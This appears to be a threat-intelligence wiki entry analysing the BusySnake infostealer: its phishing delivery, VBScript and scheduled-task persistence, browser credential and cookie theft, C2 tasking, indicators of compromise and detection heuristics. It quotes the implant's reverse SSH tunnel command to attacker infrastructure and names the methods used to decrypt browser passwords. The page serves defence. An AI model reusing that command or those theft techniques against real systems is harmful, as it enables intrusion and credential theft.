# BusySnake Stealer

## Summary
**BusySnake Stealer** is a Windows-focused Python infostealer reported by Kaspersky in July 2026 and attributed to **Armored Likho** with medium confidence. It is delivered through spear-phishing archives, stages a Python 3.12 runtime and PyArmor-protected payloads under `%APPDATA%\\WindowsHelper`, persists with VBScript and scheduled tasks, and steals browser credentials, cookies, clipboard data, screenshots, documents, and 64-character hexadecimal keys.

## Tags
- tools
- malware
- infostealer
- Windows
- Python malware
- PyArmor
- browser credential theft
- cookie theft
- screenshot theft
- clipboard theft
- document exfiltration
- reverse SSH tunneling
- scheduled task persistence
- VBScript
- C2 tasking
- Armored Likho
- BusySnake Stealer

## Delivery and staging
Kaspersky observed two main first-stage paths:

1. **NSIS EXE attachment** — a fake psychological-test executable launches a decoy application, drops a legitimate `pnx.exe`, injects loader code into it, and downloads archives from GitHub-hosted release infrastructure.
2. **LNK attachment** — a `Zayavka_[redacted].lnk` file abuses the ZDI-CAN-25373 shortcut command-line hiding technique, launches an obfuscated `rundll32.exe` / PowerShell chain, displays a decoy DOCX, then downloads Python and `data.zip` payload content.

Both paths converge on a working directory under `%APPDATA%\\WindowsHelper` containing `module.pyw`, PyArmor runtime components, Python 3.12, `get-pip.py`, and helper scripts.

## Persistence
BusySnake creates VBScript helpers in `%APPDATA%\\WindowsHelper`:

- `wh_selfdelete.vbs` removes the initial loader artifact.
- `run.vbs` launches `module.pyw`.
- A scheduled task repeatedly launches the stealer, with Kaspersky noting a five-minute execution interval in observed samples.

A newer version shifts from direct `schtasks` invocation to `win32com.client` interaction with the Windows `Schedule.Service` COM object, likely to reduce detection from simple command-line rules.

## Capabilities
Kaspersky's disassembly identified handler-based capabilities including:

- single-instance locking;
- clipboard logging;
- file inventory collection into a local database;
- extraction of 64-character hexadecimal keys from files;
- priority document exfiltration;
- screenshot capture and archive rotation;
- C2 task polling and task-status reporting;
- scheduled-task persistence checks and repair;
- Chromium password theft via `Login State`, `Login Data`, DPAPI, and SQL queries;
- Firefox password theft via `logins.json`, `key4.db`, NSS initialization, and `PK11SDR_Decrypt()` when profiles lack a master password;
- Chromium and Firefox cookie extraction to `Roaming\\WindowsHelper\\all_browser_data.json` before exfiltration and cleanup;
- optional cookie theft through a downloaded browser-extension module;
- built-in reverse SSH tunneling.

## Reverse SSH tunneling
BusySnake integrates a feature that resembles Armored Likho's earlier Go2Tunnel tooling. The implant requests tunnel parameters from C2, including a victim-specific username, SOCKS host/port, OpenSSH private key, and an SSH command using arguments such as:

```text
-N -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p <port> -R 0.0.0.0:<port> <name>@<ip>
```

Kaspersky observed `grked[.]online` and `159.198.32[.]222` in this flow.

## C2 and tasking
A newer BusySnake version uses an explicit task-management framework with statuses such as `SCHEDULED`, `IN_PROGRESS`, `SUCCEEDED`, and `FAILED`. Reported API-style endpoints include command polling, task polling, task-status updates, and file upload paths below `/api/v1/client/{client_id}/...`.

## Indicators called out by Kaspersky
Selected public indicators from Kaspersky's report include:

- BusySnake hashes / archives: `C7622A1EFFA27BBFEE6D6E03D6474343`, `80B7700053E115D65365CE7330383320`, `6B45DDB39A6E86229348DCBBA3857E7C`, `006887732CA4A4A46A97989CF4DEEEF6`
- C2 / infrastructure: `winupdate[.]live`, `arvax[.]xyz`, `varenie[.]live`, `lvl99[.]store`, `onetoken[.]ink`, `winupdate[.]ink`, `grked[.]online`, `ndrt[.]ink`, `myboard[.]chickenkiller.com`, `myboard[.]twilightparadox.com`, `159.198.41[.]140`, `159.198.75[.]219`, `159.198.32[.]222`, `69.67.173[.]153`

## Defender heuristics
- Alert on Office/Archive/LNK-originated execution of `rundll32.exe` followed by PowerShell downloads and Python runtime staging.
- Monitor for Python 3.12 bundles, PyArmor runtime files, `.pyw` execution, and VBScript launchers under `%APPDATA%\\WindowsHelper`.
- Hunt for scheduled tasks named like Windows helper/update components that run user-writable Python or VBScript paths.
- Review browser credential and cookie database reads by unexpected Python processes, especially when followed by writes to `chromium_passwords.json` or `all_browser_data.json`.
- Detect reverse SSH commands that disable host-key checking and request remote `-R 0.0.0.0:<port>` forwarding from endpoints.

## Related pages
- [Armored Likho](../actors/armored-likho.md)
- [Armored Likho BusySnake campaign](../ops/armored-likho-busysnake-campaign.md)

## Sources
- Kaspersky Securelist: <https://securelist.com/tr/armored-likho-apt-with-busysnake-stealer/120292/>
